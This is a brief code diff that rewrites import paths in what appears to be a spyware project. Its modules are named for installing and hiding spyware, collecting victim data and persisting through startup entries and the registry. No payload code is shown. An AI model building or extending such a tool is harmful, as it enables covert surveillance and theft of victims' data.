@@ -26,8 +26,8 @@ sys.path.insert(0, script_dir)
 
 # Import all spyware functions with relative imports
 try:
-    from delivery.technique2.function2_install_spyware import install_spyware
-    from delivery.technique2.function3_hide_spyware import hide_spyware
+    from delivery.delivery_technique1.function2_install_spyware import install_spyware
+    from delivery.delivery_technique1.function3_hide_spyware import hide_spyware
     from auto_run.technique1.function4_collect_data import collect_victim_data
     from auto_run.technique2.function5_persistence_startup import add_spyware_startup
     from auto_run.technique2.function6_persistence_registry import add_spyware_registry
